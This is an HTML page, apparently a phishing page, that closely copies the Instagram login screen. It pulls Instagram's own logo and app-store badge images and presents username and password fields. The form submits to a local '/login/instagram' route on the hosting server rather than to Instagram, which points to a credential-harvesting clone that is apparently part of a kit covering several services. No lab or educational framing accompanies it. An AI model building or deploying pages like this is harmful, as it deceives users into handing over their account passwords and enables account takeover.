<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram â€¢ Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 0;
            margin-bottom: 10px;
            width: 100%;
        }
        .logo {
            margin: 36px 0 12px;
            text-align: center;
        }
        .logo img {
            width: 175px;
        }
        .form-group {
            margin: 0 40px 6px;
        }
        .form-control {
            width: 100%;
            padding: 9px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 14px;
            line-height: 18px;
        }
        .form-control:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
        }
        .login-btn:disabled {
            background-color: rgba(0, 149, 246, 0.3);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
        }
        .divider-line {
            background-color: #dbdbdb;
            height: 1px;
            flex-grow: 1;
        }
        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            line-height: 15px;
            margin: 0 18px;
            text-transform: uppercase;
        }
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 40px;
            text-decoration: none;
        }
        .facebook-icon {
            margin-right: 8px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png');
            background-position: -414px -259px;
            background-size: 440px 411px;
            width: 16px;
            height: 16px;
            display: inline-block;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 12px;
            text-align: center;
            text-decoration: none;
            display: block;
        }
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 0;
            margin-bottom: 10px;
            width: 100%;
            text-align: center;
        }
        .signup-text {
            color: #262626;
            font-size: 14px;
            margin: 15px;
        }
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .app-download {
            text-align: center;
            margin: 10px 0;
        }
        .app-text {
            color: #262626;
            font-size: 14px;
            line-height: 18px;
            margin: 10px 20px;
        }
        .app-buttons {
            display: flex;
            justify-content: center;
        }
        .app-button {
            margin: 0 4px;
        }
        .app-button img {
            height: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
            </div>
            
            <form action="/login/instagram" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" class="form-control" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" class="form-control" required>
                </div>
                
                <div class="form-group">
                    <button type="submit" class="login-btn">Log In</button>
                </div>
            </form>
            
            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">or</div>
                <div class="divider-line"></div>
            </div>
            
            <a href="#" class="facebook-login">
                <span class="facebook-icon"></span>
                Log in with Facebook
            </a>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            <p class="signup-text">
                Don't have an account? <a href="#" class="signup-link">Sign up</a>
            </p>
        </div>
        
        <div class="app-download">
            <p class="app-text">Get the app.</p>
            <div class="app-buttons">
                <a href="#" class="app-button">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                </a>
                <a href="#" class="app-button">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
                </a>
            </div>
        </div>
    </div>
</body>
</html>
